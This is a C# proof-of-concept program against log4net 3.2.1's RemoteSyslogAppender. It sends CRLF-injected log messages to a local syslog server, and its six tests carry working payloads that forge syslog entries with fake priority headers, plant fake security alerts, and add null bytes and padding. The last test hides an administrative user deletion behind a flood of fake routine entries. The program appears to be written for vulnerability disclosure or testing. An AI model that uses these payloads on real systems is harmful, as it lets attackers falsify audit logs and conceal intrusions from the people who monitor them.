using System;
using log4net;
using log4net.Config;

namespace Log4netCRLFPoC
{
    class Program
    {
        private static readonly ILog log = LogManager.GetLogger(typeof(Program));

        static void Main(string[] args)
        {
            // Configure log4net from App.config
            XmlConfigurator.Configure();

            Console.WriteLine("=================================================================");
            Console.WriteLine("   CWE-117: CRLF Injection PoC - RemoteSyslogAppender");
            Console.WriteLine("   Target: log4net v3.2.1");
            Console.WriteLine("   Vulnerability: Lines 387-407 in RemoteSyslogAppender.cs");
            Console.WriteLine("=================================================================\n");

            Console.WriteLine("IMPORTANT: Ensure syslog server is running on 127.0.0.1:514");
            Console.WriteLine("Monitor with: sudo tail -f /var/log/syslog | grep log4net-poc\n");
            
            Console.WriteLine("Press ENTER to start tests...");
            Console.ReadLine();

              // Test 1: Normal log message (baseline)
            Console.WriteLine("\n[TEST 1] Normal message (baseline)");
            Console.WriteLine("Expected: Single log entry");
            log.Info("Normal user login: alice");
            Console.WriteLine("✓ Sent: Normal user login: alice");
            System.Threading.Thread.Sleep(1000);

            // Test 2: CRLF Injection - Forge log entry with fake priority
            Console.WriteLine("\n[TEST 2] CRLF Injection - Forge log entry");
            Console.WriteLine("Expected: TWO entries - one legitimate, one forged");
            string maliciousInput = "alice\n<134>1 2024-01-15T10:30:00Z fakehost myapp - - - FORGED: Admin privilege escalation";
            log.Info($"User login: {maliciousInput}");
            Console.WriteLine("✓ Sent with CRLF injection");
            Console.WriteLine("  Legitimate: User login: alice");
            Console.WriteLine("  FORGED: <134>1 2024-01-15T10:30:00Z fakehost myapp - - - FORGED: Admin privilege escalation");
            System.Threading.Thread.Sleep(1000);

            // Test 3: Multiple CRLF - Log poisoning
            Console.WriteLine("\n[TEST 3] Multiple CRLF - Log poisoning");
            Console.WriteLine("Expected: THREE entries from single log call");
            string poisonedInput = "normal_user\r\n<134>FAKE ALERT: Security breach detected\r\n<134>FAKE INFO: Unauthorized access successful";
            log.Warn($"Failed login attempt: {poisonedInput}");
            Console.WriteLine("✓ Sent with multiple CRLF sequences");
            Console.WriteLine("  Entry 1: Failed login attempt: normal_user");
            Console.WriteLine("  Entry 2 (FORGED): <134>FAKE ALERT: Security breach detected");
            Console.WriteLine("  Entry 3 (FORGED): <134>FAKE INFO: Unauthorized access successful");
            System.Threading.Thread.Sleep(1000);

            // Test 4: CRLF with null bytes
            Console.WriteLine("\n[TEST 4] CRLF with null bytes");
            Console.WriteLine("Expected: Injection with null byte bypass attempt");
            string nullByteAttack = "user\x00\n<134>Null byte injection test - bypassing filters";
            log.Error($"Error processing user: {nullByteAttack}");
            Console.WriteLine("✓ Sent with null byte + CRLF");
            System.Threading.Thread.Sleep(1000);

            // Test 5: UDP fragmentation via CRLF
            Console.WriteLine("\n[TEST 5] UDP fragmentation attack via CRLF");
            Console.WriteLine("Expected: Large message split into multiple packets");
            string fragmentAttack = "legitimate_transaction_id_12345\n" + 
                                   new string('A', 500) + 
                                   "\n<134>FORGED: Fragment overflow successful - hidden malicious activity";
            log.Fatal($"Critical system error: {fragmentAttack}");
            Console.WriteLine("✓ Sent large fragmented message with CRLF injection");
            System.Threading.Thread.Sleep(1000);

            // Test 6: Realistic attack scenario - Hide malicious activity
            Console.WriteLine("\n[TEST 6] Realistic Attack - Hide malicious activity");
            Console.WriteLine("Expected: Legitimate entry followed by forged benign entries to push out real logs");
            string hideAttack = "admin_action_delete_user\n" +
                               "<134>INFO: Routine system maintenance\n" +
                               "<134>INFO: Cache cleared successfully\n" +
                               "<134>INFO: Temporary files removed\n" +
                               "<134>INFO: Database optimization complete";
            log.Warn($"Administrative action: {hideAttack}");
            Console.WriteLine("✓ Sent log hiding attack (flood with fake benign entries)");
            System.Threading.Thread.Sleep(1000);

            Console.WriteLine("\n=================================================================");
            Console.WriteLine("   PoC Tests Complete!");
            Console.WriteLine("=================================================================");
            Console.WriteLine("\nVerification Steps:");
            Console.WriteLine("1. Check syslog server output: sudo tail -50 /var/log/syslog | grep log4net-poc");
            Console.WriteLine("2. Count log entries for each test");
            Console.WriteLine("3. Verify forged entries with injected priority values");
            Console.WriteLine("\nVulnerability Confirmed if:");
            Console.WriteLine("- Test 2 shows TWO separate syslog entries instead of one");
            Console.WriteLine("- Test 3 shows THREE separate entries");
            Console.WriteLine("- Forged entries contain attacker-controlled priority headers");
            
            Console.WriteLine("\n\nPress any key to exit...");
            Console.ReadKey();
        }
    }
}
